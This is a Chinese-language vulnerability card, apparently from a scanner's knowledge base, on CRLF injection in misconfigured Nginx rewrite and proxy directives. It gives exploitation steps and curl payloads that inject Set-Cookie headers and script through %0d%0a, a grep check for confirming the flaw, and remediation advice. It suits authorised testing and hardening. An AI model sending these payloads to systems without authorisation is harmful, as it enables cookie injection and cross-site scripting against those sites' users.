---
id: NGINX-CRLF-INJECTION
title: Nginx CRLF 注入漏洞
product: nginx
vendor: Nginx
version_affected: "任意版本（配置相关）"
severity: MEDIUM
tags: [crlf_injection, header_injection, xss, 无需认证]
fingerprint: ["Nginx"]
---

## 漏洞描述

当 Nginx 配置中 `rewrite` 或 `proxy_pass` 指令直接使用未经过滤的用户输入（如 `$uri`）时，Nginx 会对 `$uri` 进行 URL 解码，攻击者可以通过注入 `%0d%0a`（CRLF 换行符）来操控 HTTP 响应头，实现 Cookie 注入、HTTP 响应拆分、甚至反射型 XSS。

## 影响版本

- 任意版本（取决于配置）

## 前置条件

- 无需认证
- 目标 Nginx 配置中存在使用 `$uri` 或 `$document_uri` 的 `rewrite`/`return`/`proxy_pass` 指令

## 利用步骤

1. 识别目标存在 URL 跳转或代理功能
2. 在 URL 中注入 `%0d%0a` 测试是否能注入 HTTP 响应头
3. 根据场景进行 Cookie 注入或 XSS 利用

## Payload

```bash
# 注入自定义 Cookie
curl -i "http://TARGET/%0d%0aSet-Cookie:%20admin=1"

# 注入多个 Header + XSS（HTTP 响应拆分）
curl -i "http://TARGET/%0d%0a%0d%0a<script>alert(1)</script>"

# 利用 CRLF 绕过 CSP 注入 XSS
curl -i "http://TARGET/%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(document.domain)</script>"
```

## 验证方法

```bash
# 检查响应头中是否出现注入的 Set-Cookie
curl -sI "http://TARGET/%0d%0aSet-Cookie:%20test=crlf" | grep -i "Set-Cookie: test=crlf"
# 如果响应头中出现 Set-Cookie: test=crlf，则漏洞存在

# 检查响应体中是否出现注入的 HTML
curl -s "http://TARGET/%0d%0a%0d%0a<h1>injected</h1>" | grep "injected"
```

## 修复建议

1. 在 Nginx 配置中使用 `$request_uri`（不进行 URL 解码）代替 `$uri`
2. 对用户输入进行 CRLF 字符过滤
3. 升级 Nginx 至最新版本
4. 使用 WAF 拦截包含 `%0d%0a` 的请求
